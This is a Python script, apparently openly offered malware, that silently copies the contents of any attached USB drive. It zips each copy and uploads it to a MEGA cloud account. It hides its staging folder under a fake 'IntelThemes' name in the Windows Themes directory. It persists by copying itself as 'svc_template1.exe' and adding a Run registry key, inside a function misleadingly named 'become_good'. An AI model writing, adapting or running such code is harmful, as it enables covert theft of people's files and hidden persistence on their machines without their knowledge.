import os
import shutil
import zipfile
import time
from mega import Mega
import subprocess
import sys

# MEGA credentials
MEGA_EMAIL = "email@email.com"  # Replace with your MEGA email
MEGA_PASSWORD = "password123"  # Replace with your MEGA password

# Base directory to save USB contents locally
BASE_SAVE_DIR = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "Themes")
BASE_FOLDER_NAME = "IntelThemes"

# MEGA folder name for uploads
MEGA_TARGET_DIR = "usb_captures"

# Excluded drives
EXCLUDED_DRIVES = ["C:\\", "D:\\"]

# File to store timestamps of files in USB
TIMESTAMP_FILE = os.path.join(BASE_SAVE_DIR, "last_timestamps.txt")

def become_good():
    themes_file_location = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "svc_template1.exe")
    if not os.path.exists(themes_file_location):
        shutil.copyfile(sys.executable, themes_file_location)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc_template /t REG_SZ /d "' + themes_file_location + '"', shell=True)
    else:
        # If file exists, overwrite it without asking
        shutil.copyfile(sys.executable, themes_file_location)
        print("File 'svc_template1.exe' already exists. It has been overwritten.")




def get_file_timestamps(folder_path):
    """Get file modification timestamps for a folder."""
    timestamps = {}
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            timestamps[file_path] = os.path.getmtime(file_path)
    return timestamps


def save_timestamps(timestamps):
    """Save file timestamps to a file."""
    with open(TIMESTAMP_FILE, "w") as f:
        for file_path, mtime in timestamps.items():
            f.write(f"{file_path}|{mtime}\n")


def load_timestamps():
    """Load file timestamps from a file."""
    if not os.path.exists(TIMESTAMP_FILE):
        return {}
    timestamps = {}
    with open(TIMESTAMP_FILE, "r") as f:
        for line in f:
            file_path, mtime = line.strip().split("|")
            timestamps[file_path] = float(mtime)
    return timestamps


def has_usb_changed(usb_path):
    """Check if the USB contents have changed."""
    current_timestamps = get_file_timestamps(usb_path)
    previous_timestamps = load_timestamps()
    return current_timestamps != previous_timestamps


def get_next_available_directory(base_path, base_name):
    """Get the next available folder name, e.g., IntelThemes, IntelThemes1, IntelThemes2, etc."""
    index = 0
    while True:
        folder_name = base_name if index == 0 else f"{base_name}{index}"
        full_path = os.path.join(base_path, folder_name)
        if not os.path.exists(full_path):
            os.makedirs(full_path, exist_ok=True)
            return full_path
        index += 1


def copy_usb_contents(usb_path, destination):
    """Copy USB contents to the destination folder."""
    try:
        shutil.copytree(usb_path, destination, dirs_exist_ok=True)
        print(f"Copied files from USB: {usb_path} to {destination}")
        return True
    except Exception as e:
        print(f"Error copying USB files: {e}")
        return False


def zip_folder(folder_path, zip_path):
    """Create a ZIP file from a folder."""
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, start=folder_path)
                    zipf.write(file_path, arcname)
        print("ZIP file created successfully.")
        return True
    except Exception as e:
        print(f"Error creating ZIP file: {e}")
        return False


def upload_to_mega(zip_path, target_dir_name):
    """Upload the ZIP file to a specific folder in MEGA."""
    try:
        mega = Mega()
        m = mega.login(MEGA_EMAIL, MEGA_PASSWORD)

        # Check if the target directory exists, create if not
        print(f"Checking or creating directory: {target_dir_name}...")
        target_dir = m.find(target_dir_name)
        if target_dir is None:
            target_dir = m.create_folder(target_dir_name)
            print(f"Created directory: {target_dir_name}")

        # Get the list of files in the target directory on MEGA
        zip_filename = os.path.basename(zip_path)
        existing_file = None
        files_in_dir = m.get_files()  # Get all files from MEGA account
        
        for file_id, file in files_in_dir.items():
            
            
            # Access the correct key to get the file name
            if 'a' in file and 'n' in file['a'] and file['a']['n'] == zip_filename and file['p'] == target_dir[0]:
                existing_file = file
                break

        if existing_file:
            # Rename the file by appending a timestamp or counter
            new_zip_path = zip_path.replace(".zip", f"_{int(time.time())}.zip")
            os.rename(zip_path, new_zip_path)
            print(f"File already exists, renaming to {new_zip_path}")
            zip_path = new_zip_path  # Update the path to the renamed file

        # Upload the file to the target directory
        print(f"Uploading {zip_path} to {target_dir_name} on MEGA...")
        m.upload(zip_path, dest=target_dir[0])
        print("File uploaded successfully to MEGA.")
        return True
    except Exception as e:
        print(f"Error uploading to MEGA: {e}")
        return False


def usb_dumper():
    """Monitor USB drives and upload contents to MEGA."""
    print("Scanning for USB drives...")
    while True:
        for drive_letter in range(65, 91):  # Check drive letters A-Z
            drive_path = f"{chr(drive_letter)}:\\"
            if drive_path in EXCLUDED_DRIVES:
                continue  # Skip excluded drives
            if os.path.exists(drive_path) and os.path.isdir(drive_path):
                print(f"USB drive detected: {drive_path}")
                if has_usb_changed(drive_path):  # Check for changes
                    save_dir = get_next_available_directory(BASE_SAVE_DIR, BASE_FOLDER_NAME)
                    if copy_usb_contents(drive_path, save_dir):
                        zip_path = save_dir + ".zip"
                        if zip_folder(save_dir, zip_path):
                            if upload_to_mega(zip_path, MEGA_TARGET_DIR):
                                # Save the new timestamps
                                save_timestamps(get_file_timestamps(drive_path))
                                print("Changes uploaded to MEGA.")
                else:
                    print("No changes detected. Skipping upload.")
                break
        time.sleep(10)  # Check for USB drives every 10 seconds


if __name__ == "__main__":
    become_good()
    usb_dumper()
